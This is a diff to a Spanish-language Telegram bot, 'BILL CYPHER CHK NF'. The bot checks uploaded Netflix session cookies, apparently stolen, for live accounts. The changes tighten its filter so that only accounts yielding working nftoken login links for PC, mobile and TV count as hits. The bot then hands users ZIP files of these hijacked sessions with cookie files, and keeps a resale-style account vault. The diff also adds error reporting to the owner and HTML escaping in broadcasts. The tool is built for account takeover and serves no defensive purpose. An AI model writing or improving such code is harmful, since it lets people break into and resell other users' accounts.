@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 """
 BILL CYPHER CHK NF — Edition 5G Turbo Definitive
+• Filtro estricto de Hits en ZIP (Cero falsos positivos o cuentas sin link)
 • Cero cruce de perfiles (100% Exact Match)
 • Enlaces oficiales de TV (/tv9) y Móvil (/unsupported) con sesión autenticada
 • Modo Mantenimiento con alerta masiva automática
 • Auto-restauración en arranque desde la nube de Telegram (Anti-Wipe)
+• Reporte de fallos en tiempo real a @didierJC
 • Tipografía estilizada Sans-Bold Italic
 """
 
@@ -21,6 +23,7 @@ import re
 import functools
 import threading
 import html
+import traceback
 from datetime import date
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor
@@ -435,7 +438,7 @@ def extract_all_accounts_from_bytes(raw_bytes: bytes, filename: str = "") -> lis
                     except Exception:
                         continue
         except Exception as e:
-            logger.warning(f"Error leyendo ZIP: {e}")
+            logger.warning(f"Error leyendo ZIP: %s", e)
     else:
         text = raw_bytes.decode("utf-8", errors="replace")
         acc = parse_account_card_from_text(text)
@@ -498,12 +501,6 @@ def extract_bgiqv_token(nft_dict: dict, fallback_token: str) -> str:
     return fallback_token
 
 def build_official_login_keyboard(raw_token: str) -> InlineKeyboardMarkup:
-    """
-    Enlaces web oficiales de acceso directo:
-    • 📺 TV: /tv9 abre la sesión iniciada para vincular el código de 8 dígitos de la TV.
-    • 📱 Móvil: /unsupported fuerza la sesión en el navegador Safari/Chrome sin abrir la app.
-    • 🖥️ PC: /browse para navegación directa en navegador.
-    """
     token = raw_token.strip()
     pc_url = f"https://www.netflix.com/browse?nftoken={token}"
     mobile_url = f"https://www.netflix.com/unsupported?nftoken={token}"
@@ -927,21 +924,8 @@ def _cancel_keyboard(msg_id: int) -> InlineKeyboardMarkup:
 
 
 # ---------------------------------------------------------------------------
-# Formateadores de tarjetas de resultados
+# Formateadores de tarjetas de cuentas
 # ---------------------------------------------------------------------------
-
-def make_progress_bar(done: int, total: int, width: int = 14) -> str:
-    if total == 0:
-        return f"[{'▱' * width}] 0%"
-    filled = int(width * done / total)
-    bar = "▰" * filled + "▱" * (width - filled)
-    pct = int(100 * done / total)
-    return f"[{bar}] {pct}%"
-
-def _yes_no(val) -> str:
-    if val is None:
-        return "Desconocido"
-    return "Sí" if val else "No"
 
 def _plan_title(plan_name: str, status: str) -> str:
     p = (plan_name or "").lower()
@@ -1308,11 +1292,10 @@ def _score_account(result: dict) -> tuple:
 
 
 # ---------------------------------------------------------------------------
-# Generador y empaquetador ZIP de hits
+# Generador y empaquetador ZIP de hits (Con Validación Estricta)
 # ---------------------------------------------------------------------------
 
 async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> None:
-    loop = asyncio.get_running_loop()
     today = date.today().isoformat()
     exp = "9999999999"
 
@@ -1327,18 +1310,6 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
         deduped.append(item)
 
     dupes_removed = len(hits) - len(deduped)
-
-    def _safe_token_worker(result: dict) -> None:
-        try:
-            nf_id = result.get("netflix_id")
-            if nf_id:
-                result["nftoken"] = generate_nftoken({"NetflixId": nf_id})
-        except Exception as _e:
-            result["nftoken"] = {"success": False, "error": str(_e)}
-
-    await asyncio.gather(*[
-        loop.run_in_executor(_EXECUTOR, _safe_token_worker, r) for r, _, _ in deduped
-    ], return_exceptions=True)
 
     premium = [(r, s, w) for r, s, w in deduped if "premium" in (r.get("plan_name") or "").lower()]
     normal  = [(r, s, w) for r, s, w in deduped if "premium" not in (r.get("plan_name") or "").lower()]
@@ -1430,18 +1401,15 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
                 lines.append(f"  ⚠  {iss}")
 
         lines += ["", f"  {'ENLACES DE INICIO DE SESIÓN':^{W-2}}", thin]
-        if nft.get("success"):
-            real_t = extract_bgiqv_token(nft, nf_id)
-            pc_lnk = f"https://www.netflix.com/browse?nftoken={real_t}"
-            mob_lnk = f"https://www.netflix.com/unsupported?nftoken={real_t}"
-            tv_lnk = f"https://www.netflix.com/tv9?nftoken={real_t}"
-            lines.append(box_line("💻 PC:", pc_lnk))
-            lines.append(box_line("📱 Móvil:", mob_lnk))
-            lines.append(box_line("📺 TV:", tv_lnk))
-            if nft.get("expires"):
-                lines.append(box_line("Expires:", nft["expires"]))
-        else:
-            lines.append(box_line("Status:", "No disponible"))
+        real_t = extract_bgiqv_token(nft, nf_id)
+        pc_lnk = f"https://www.netflix.com/browse?nftoken={real_t}"
+        mob_lnk = f"https://www.netflix.com/unsupported?nftoken={real_t}"
+        tv_lnk = f"https://www.netflix.com/tv9?nftoken={real_t}"
+        lines.append(box_line("💻 PC:", pc_lnk))
+        lines.append(box_line("📱 Móvil:", mob_lnk))
+        lines.append(box_line("📺 TV:", tv_lnk))
+        if nft.get("expires"):
+            lines.append(box_line("Expires:", nft["expires"]))
 
         lines += ["", f"  {'COOKIES  (Netscape HTTP Cookie File)':^{W-2}}", thin]
         if nf_id:
@@ -1579,7 +1547,7 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
         return
 
     uid = update.effective_user.id if update.effective_user else 0
-    hits_list: list[tuple[dict, str, str]] = []
+    raw_hits_list: list[tuple[dict, str, str]] = []
     hits = frees = invalids = errors = on_hold = 0
     t_start = time.monotonic()
     last_edit_time = 0.0
@@ -1591,8 +1559,6 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
         if session_id in _CANCEL_SESSIONS:
             _CANCEL_SESSIONS.discard(session_id)
             await status_msg.edit_text("🛑 <b>Verificación cancelada.</b>", parse_mode=ParseMode.HTML)
-            if hits_list:
-                await send_hits_zip(update, hits_list)
             return
 
         batch = cookie_sets[batch_start: batch_start + BULK_CONCURRENCY]
@@ -1614,32 +1580,38 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
             idx = batch_start + batch.index((src, cs, raw)) + 1
 
             if status == "hit":
-                hits += 1
-                hits_list.append((result, src, raw))
+                raw_hits_list.append((result, src, raw))
             elif status == "free":
                 frees += 1
             elif status == "on_hold":
                 on_hold += 1
-                hits_list.append((result, src, raw))
+                raw_hits_list.append((result, src, raw))
             else:
                 invalids += 1
 
             user_id = update.effective_user.id if update.effective_user else 0
             stats_tracker.record_check(status, user_id=user_id, source=src)
-            if status in ("hit", "free", "on_hold"):
-                mongodb_store.save_hit(result, user_id=user_id, source=src)
             result["_source"] = src
 
             if not is_bulk:
-                txt = format_result(result, idx, total, source=src, user_id=uid)
-                core_tok = extract_core_netflix_id(cs)
-                kb = build_official_login_keyboard(core_tok)
-                try:
-                    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
-                except Exception:
-                    pass
+                # Verificación estricta individual: requiere token válido
+                tok = result.get("netflix_id") or extract_core_netflix_id(cs)
+                nft_res = get_live_nftoken(cs, tok)
+                if nft_res and nft_res.get("success"):
+                    hits += 1
+                    result["nftoken"] = nft_res
+                    real_tok = extract_bgiqv_token(nft_res, tok)
+                    txt = format_result(result, idx, total, source=src, user_id=uid)
+                    kb = build_official_login_keyboard(real_tok)
+                    try:
+                        await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
+                    except Exception:
+                        pass
+                else:
+                    invalids += 1
+                    txt = format_result({"status": "invalid", "message": "Cookie caída / sin enlaces válidos."}, idx, total, source=src, user_id=uid)
+                    await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
 
-        # Throttle a 3.5 segundos para no ser bloqueado por Telegram
         if is_bulk:
             now_time = time.monotonic()
             done_so_far = min(batch_start + len(batch), total)
@@ -1647,13 +1619,14 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                 last_edit_time = now_time
                 elapsed = now_time - t_start
                 speed = done_so_far / elapsed * 60 if elapsed > 1 and done_so_far > 0 else 0
+                temp_hits = len(raw_hits_list)
                 try:
                     await status_msg.edit_text(
                         "⚡ <b>" + to_sans_bold_italic("BILL CYPHER | VERIFICANDO 5G") + "</b>\n"
                         "━━━━━━━━━━━━━━━━━━━━━━\n"
                         f"📊 <b>Progreso:</b> {make_progress_bar(done_so_far, total)} {done_so_far}/{total}\n"
                         f"🚀 <b>Velocidad:</b> {speed:.1f} acc/min\n\n"
-                        f"● <b>Hits (Live):</b> {hits}  ·  <b>Muertas (Dead):</b> {invalids}\n"
+                        f"● <b>Hits Detectados:</b> {temp_hits}  ·  <b>Inválidas:</b> {invalids}\n"
                         f"● <b>En espera:</b> {on_hold}  ·  <b>Free:</b> {frees}\n"
                         "━━━━━━━━━━━━━━━━━━━━━━\n"
                         "⏳ <i>Procesando cuentas a máxima velocidad 5G...</i>",
@@ -1663,6 +1636,40 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                 except Exception:
                     pass
 
+    # =======================================================================
+    # FILTRO ESTRICTO DE HITS: Cero falsos positivos o cuentas sin enlace
+    # =======================================================================
+    verified_hits_list = []
+    if is_bulk and raw_hits_list:
+        try:
+            await status_msg.edit_text(
+                "⚡ <b>" + to_sans_bold_italic("BILL CYPHER | VALIDANDO ENLACES") + "</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🔍 <i>Validando que cada uno de los {len(raw_hits_list)} hits tenga enlaces activos...</i>",
+                parse_mode=ParseMode.HTML
+            )
+        except Exception:
+            pass
+
+        async def _verify_token_worker(item):
+            res, src, raw = item
+            tok = res.get("netflix_id") or extract_core_netflix_id(raw)
+            token_data = await loop.run_in_executor(_EXECUTOR, lambda: get_live_nftoken(raw, tok))
+            if token_data and token_data.get("success"):
+                res["nftoken"] = token_data
+                return (res, src, raw)
+            return None
+
+        checked_items = await asyncio.gather(*[_verify_token_worker(it) for it in raw_hits_list], return_exceptions=True)
+        for it in checked_items:
+            if isinstance(it, tuple):
+                verified_hits_list.append(it)
+            else:
+                invalids += 1
+
+    hits = sum(1 for r, _, _ in verified_hits_list if normalize_status(r.get("status"), r) == "hit")
+    on_hold = sum(1 for r, _, _ in verified_hits_list if normalize_status(r.get("status"), r) == "on_hold")
+
     elapsed = time.monotonic() - t_start
     speed   = total / elapsed * 60 if elapsed > 0 else 0
     mins, secs = divmod(int(elapsed), 60)
@@ -1671,22 +1678,8 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
     _CANCEL_SESSIONS.discard(session_id)
     _USER_SESSION.pop(uid, None)
 
-    if is_bulk and hits_list:
-        _seen_keys: set[str] = set()
-        _deduped: list[tuple[dict, str, str]] = []
-        for _item in hits_list:
-            _nf_id = _item[0].get("netflix_id") or ""
-            if _nf_id and _nf_id in _seen_keys:
-                continue
-            if _nf_id:
-                _seen_keys.add(_nf_id)
-            _deduped.append(_item)
-        hits_list = _deduped
-        hits    = sum(1 for r, _, _ in _deduped if normalize_status(r.get("status"), r) == "hit")
-        on_hold = sum(1 for r, _, _ in _deduped if normalize_status(r.get("status"), r) == "on_hold")
-
     if is_bulk:
-        premium_count = sum(1 for r, _, _ in hits_list if "premium" in (r.get("plan_name") or "").lower())
+        premium_count = sum(1 for r, _, _ in verified_hits_list if "premium" in (r.get("plan_name") or "").lower())
         try:
             await status_msg.edit_text(
                 "⚡ <b>" + to_sans_bold_italic("BILL CYPHER | COMPLETADO 5G") + "</b>\n"
@@ -1703,50 +1696,52 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
         await update.message.reply_text(
             f"📊 <b>Resumen Masivo — Resultados</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"  ✅ Hits (Live / Activos) » <b>{hits}</b> (🌟 Premium: {premium_count})\n"
-            f"  ❌ Muertas (Dead / Inválidas) » <b>{invalids}</b>\n"
-            f"  ⏸️ En espera (On Hold)   » <b>{on_hold}</b>\n"
-            f"  🔓 Free (Sin plan)       » <b>{frees}</b>\n"
+            f"  ✅ Hits (Live con Enlaces) » <b>{hits}</b> (🌟 Premium: {premium_count})\n"
+            f"  ❌ Muertas / Sin enlace    » <b>{invalids}</b>\n"
+            f"  ⏸️ En espera (On Hold)     » <b>{on_hold}</b>\n"
+            f"  🔓 Free (Sin plan)         » <b>{frees}</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"  📦 Total comprobado      » <b>{total}</b>\n"
-            f"  ⏱️ Tiempo total          » <b>{time_str}</b>\n"
-            f"  🚀 Velocidad media       » <b>{speed:.1f} acc/min</b>",
+            f"  📦 Total comprobado        » <b>{total}</b>\n"
+            f"  ⏱️ Tiempo total            » <b>{time_str}</b>\n"
+            f"  🚀 Velocidad media         » <b>{speed:.1f} acc/min</b>",
             parse_mode=ParseMode.HTML,
         )
 
-        if hits_list:
+        if verified_hits_list:
             delivery = _get_delivery(uid)
             if delivery == "cards":
-                for card_i, (c_result, c_src, c_raw) in enumerate(hits_list, 1):
+                for card_i, (c_result, c_src, c_raw) in enumerate(verified_hits_list, 1):
                     try:
-                        c_txt = format_result(c_result, card_i, len(hits_list), source=c_src, user_id=uid)
+                        c_txt = format_result(c_result, card_i, len(verified_hits_list), source=c_src, user_id=uid)
                         core_t = extract_core_netflix_id(c_raw)
-                        c_kb = build_official_login_keyboard(core_t)
+                        real_t = extract_bgiqv_token(c_result.get("nftoken", {}), core_t)
+                        c_kb = build_official_login_keyboard(real_t)
                         await update.message.reply_text(c_txt, parse_mode=ParseMode.HTML, reply_markup=c_kb)
                         await asyncio.sleep(0.3)
                     except Exception:
                         pass
             else:
                 try:
-                    await send_hits_zip(update, hits_list)
+                    await send_hits_zip(update, verified_hits_list)
                 except Exception as _ze:
                     await update.message.reply_text(f"⚠️ Error al crear el ZIP: {_ze}", parse_mode=ParseMode.HTML)
 
                 try:
-                    sorted_hits = sorted(hits_list, key=lambda x: _score_account(x[0]), reverse=True)
+                    sorted_hits = sorted(verified_hits_list, key=lambda x: _score_account(x[0]), reverse=True)
                     best_result, best_src, best_raw = sorted_hits[0]
                     best_txt = format_result(best_result, 1, 1, source=best_src, user_id=uid)
                     best_tok = extract_core_netflix_id(best_raw)
-                    best_kb = build_official_login_keyboard(best_tok)
+                    real_best_tok = extract_bgiqv_token(best_result.get("nftoken", {}), best_tok)
+                    best_kb = build_official_login_keyboard(real_best_tok)
                     full_best = (
-                        "🏆 <b>Mejor Cuenta del Lote</b>\n"
+                        "🏆 <b>Mejor Cuenta del Lote (100% Verificada)</b>\n"
                         "━━━━━━━━━━━━━━━━━━━━━━\n" + best_txt
                     )
                     await update.message.reply_text(full_best, parse_mode=ParseMode.HTML, reply_markup=best_kb)
                 except Exception:
                     pass
         else:
-            await update.message.reply_text("📭 No se encontraron hits válidos en este lote.")
+            await update.message.reply_text("📭 No se encontraron hits válidos con enlaces funcionales en este lote.")
 
     try:
         await status_msg.delete()
@@ -2276,7 +2271,7 @@ async def addvault_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -
                 f"✅ <b>¡Cuentas importadas al baúl con éxito!</b>\n"
                 "━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"• 📦 <b>Cuentas únicas añadidas:</b> <code>{added}</code>\n"
-                f"• 🔒 <b>Duplicados o sin botones descartados:</b> <code>{len(extracted) - added}</code>\n"
+                f"• 🔒 <b>Duplicados descartados:</b> <code>{len(extracted) - added}</code>\n"
                 f"• 🗄️ <b>Stock total verificado:</b> <code>{len(vault)}</code>",
                 parse_mode=ParseMode.HTML
             )
@@ -2353,7 +2348,70 @@ async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE
 
 
 # ===========================================================================
-# 10. RESPALDO Y NUBE TELEGRAM (AUTO-SYNC ANTI-WIPE)
+# 10. TELEMETRÍA Y ALERTAS AUTOMÁTICAS (@didierJC)
+# ===========================================================================
+_LAST_ALERT_TIME: dict[str, float] = {}
+
+async def send_admin_error_report(bot, title: str, details: str, update: Update | None = None) -> None:
+    """Envía un reporte detallado del fallo al chat del propietario @didierJC."""
+    try:
+        now = time.time()
+        error_key = f"{title}_{details[:40]}"
+        if now - _LAST_ALERT_TIME.get(error_key, 0) < 10:
+            return
+        _LAST_ALERT_TIME[error_key] = now
+
+        user_info = "Sistema / Tarea interna"
+        chat_id = "N/A"
+        raw_action = "N/A"
+
+        if update and update.effective_user:
+            u = update.effective_user
+            user_info = f"@{u.username}" if u.username else f"{u.first_name}"
+            chat_id = str(u.id)
+
+        if update:
+            if update.message and update.message.text:
+                raw_action = update.message.text[:50]
+            elif update.callback_query and update.callback_query.data:
+                raw_action = f"Botón: {update.callback_query.data}"
+
+        clean_title = html.escape(str(title))
+        clean_details = html.escape(str(details)[:800])
+        clean_action = html.escape(str(raw_action))
+
+        report_msg = (
+            "🚨 <b>ALERTA DE ERROR EN EL BOT</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"● ⚠️ <b>Tipo:</b> <code>{clean_title}</code>\n"
+            f"● 👤 <b>Usuario:</b> {user_info} (<code>{chat_id}</code>)\n"
+            f"● 🎯 <b>Acción:</b> <code>{clean_action}</code>\n"
+            f"● ⏱️ <b>Fecha:</b> <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📋 <b>Detalle del fallo:</b>\n"
+            f"<pre>{clean_details}</pre>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━"
+        )
+
+        await bot.send_message(
+            chat_id=OWNER_ID,
+            text=report_msg,
+            parse_mode=ParseMode.HTML,
+        )
+    except Exception as exc:
+        logger.error(f"Fallo enviando reporte de error al admin: {exc}")
+
+async def testerror_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """[Admin] Simula un error para comprobar la llegada de la alerta a tu chat."""
+    uid = update.effective_user.id if update.effective_user else 0
+    if not is_admin(uid):
+        return
+    await update.message.reply_text("🧪 <i>Simulando excepción de prueba...</i>", parse_mode=ParseMode.HTML)
+    raise ValueError("Prueba de alerta automática a @didierJC: El sistema de reporte está operativo.")
+
+
+# ===========================================================================
+# 11. RESPALDO Y NUBE TELEGRAM (AUTO-SYNC ANTI-WIPE)
 # ===========================================================================
 async def _cloud_auto_save(app: Application) -> None:
     try:
@@ -2463,7 +2521,7 @@ async def restore_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
 
 # ---------------------------------------------------------------------------
-# Difusión / Notificación
+# Difusión / Notificación (Con Escape HTML Estricto)
 # ---------------------------------------------------------------------------
 
 async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -2476,7 +2534,9 @@ async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         await update.message.reply_text("📢 Usa: <code>/broadcast Tu mensaje aquí</code>", parse_mode=ParseMode.HTML)
         return
 
-    broadcast_msg = update.message.text.split(maxsplit=1)[1]
+    raw_text = update.message.text.split(maxsplit=1)[1]
+    clean_text = html.escape(raw_text)
+
     if not _USERS_FILE.exists():
         await update.message.reply_text("⚠️ No hay usuarios registrados.")
         return
@@ -2495,7 +2555,7 @@ async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     formatted_broadcast = (
         "📢 <b>" + to_sans_bold_italic("NOTIFICACION DE BILL CYPHER") + "</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"{broadcast_msg}\n\n"
+        f"{clean_text}\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━"
     )
 
@@ -2996,26 +3056,34 @@ async def _session_watchdog() -> None:
 
 
 # ---------------------------------------------------------------------------
-# Manejador de errores
+# Manejador de errores global con reporte automático a @didierJC
 # ---------------------------------------------------------------------------
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     err = context.error
-    if isinstance(err, Conflict):
+
+    if isinstance(err, (Conflict, RetryAfter, TimedOut, NetworkError, Forbidden)):
         return
-    if isinstance(err, RetryAfter):
-        logger.warning("Telegram rate limit: reintento en %ss", err.retry_after)
-        return
-    if isinstance(err, (TimedOut, NetworkError, Forbidden)):
-        return
+
     if isinstance(err, BadRequest):
         logger.warning("Telegram BadRequest: %s", err)
         return
 
-    logger.error("Unhandled exception: %s", err, exc_info=context.error)
+    tb_list = traceback.format_exception(None, err, err.__traceback__)
+    tb_string = "".join(tb_list)
+
+    logger.error("Excepción no controlada: %s", err, exc_info=context.error)
+
     if isinstance(update, Update) and update.effective_user:
         _ACTIVE_USERS.pop(update.effective_user.id, None)
         _USER_SESSION.pop(update.effective_user.id, None)
+
+    await send_admin_error_report(
+        bot=context.bot,
+        title=type(err).__name__,
+        details=tb_string if tb_string else str(err),
+        update=update if isinstance(update, Update) else None,
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -3045,24 +3113,25 @@ def main() -> None:
 
     # Handlers de comandos
     app.add_handler(CommandHandler(["start", "cmds", "panel"], start_command))
-    app.add_handler(CommandHandler("help",       help_command))
-    app.add_handler(CommandHandler("info",       info_command))
-    app.add_handler(CommandHandler("mode",       mode_command))
-    app.add_handler(CommandHandler("fullinfo",   fullinfo_command))
-    app.add_handler(CommandHandler("basic",      basic_command))
-    app.add_handler(CommandHandler("settings",   settings_command))
-    app.add_handler(CommandHandler("changepw",   changepw_command))
-    app.add_handler(CommandHandler("cancel",     cancel_command))
-    app.add_handler(CommandHandler("proxy",      proxy_command))
+    app.add_handler(CommandHandler("help",          help_command))
+    app.add_handler(CommandHandler("info",          info_command))
+    app.add_handler(CommandHandler("mode",          mode_command))
+    app.add_handler(CommandHandler("fullinfo",      fullinfo_command))
+    app.add_handler(CommandHandler("basic",         basic_command))
+    app.add_handler(CommandHandler("settings",      settings_command))
+    app.add_handler(CommandHandler("changepw",      changepw_command))
+    app.add_handler(CommandHandler("cancel",        cancel_command))
+    app.add_handler(CommandHandler("proxy",         proxy_command))
     app.add_handler(CommandHandler(["broadcast", "notif"], broadcast_command))
-    app.add_handler(CommandHandler("users",      users_command))
-    app.add_handler(CommandHandler("setbanner",  setbanner_command))
-    app.add_handler(CommandHandler("addvault",   addvault_command))
-    app.add_handler(CommandHandler("clearvault", clearvault_command))
-    app.add_handler(CommandHandler("setcredits", setcredits_command))
-    app.add_handler(CommandHandler("backup",     backup_command))
-    app.add_handler(CommandHandler("restore",    restore_command))
+    app.add_handler(CommandHandler("users",         users_command))
+    app.add_handler(CommandHandler("setbanner",     setbanner_command))
+    app.add_handler(CommandHandler("addvault",      addvault_command))
+    app.add_handler(CommandHandler("clearvault",    clearvault_command))
+    app.add_handler(CommandHandler("setcredits",    setcredits_command))
+    app.add_handler(CommandHandler("backup",        backup_command))
+    app.add_handler(CommandHandler("restore",       restore_command))
     app.add_handler(CommandHandler(["mantenimiento", "maintenance"], maintenance_command))
+    app.add_handler(CommandHandler("testerror",     testerror_command))
 
     # Callbacks interactivos
     app.add_handler(CallbackQueryHandler(panel_callback,         pattern=r"^panel:"))
@@ -3087,19 +3156,20 @@ def main() -> None:
 
         # Auto-restauración silenciosa en arranque usando el mensaje fijado en Telegram
         try:
-            if not _VAULT_FILE.exists() or len(_load_vault()) == 0:
-                chat = await application.bot.get_chat(OWNER_ID)
-                if chat.pinned_message and chat.pinned_message.document:
-                    f = await chat.pinned_message.document.get_file()
-                    b = await f.download_as_bytearray()
-                    d = json.loads(b.decode("utf-8", errors="replace"))
-                    if "vault" in d:
-                        _save_vault(d["vault"])
-                    if "credits" in d:
-                        _save_credits(d["credits"])
-                    if "users" in d and isinstance(d["users"], list):
-                        _USERS_FILE.write_text("\n".join(d["users"]) + "\n", encoding="utf-8")
-                    logger.info("Base de datos restaurada automáticamente desde la nube de Telegram.")
+            chat = await application.bot.get_chat(OWNER_ID)
+            if chat.pinned_message and chat.pinned_message.document:
+                f = await chat.pinned_message.document.get_file()
+                b = await f.download_as_bytearray()
+                d = json.loads(b.decode("utf-8", errors="replace"))
+                cloud_vault = d.get("vault", [])
+                local_vault = _load_vault()
+                if len(cloud_vault) > len(local_vault):
+                    _save_vault(cloud_vault)
+                if d.get("credits"):
+                    _save_credits(d["credits"])
+                if d.get("users") and isinstance(d["users"], list):
+                    _USERS_FILE.write_text("\n".join(d["users"]) + "\n", encoding="utf-8")
+                logger.info("Base de datos sincronizada automáticamente desde la nube de Telegram.")
         except Exception as e:
             logger.debug(f"Auto-restore on init: {e}")
 
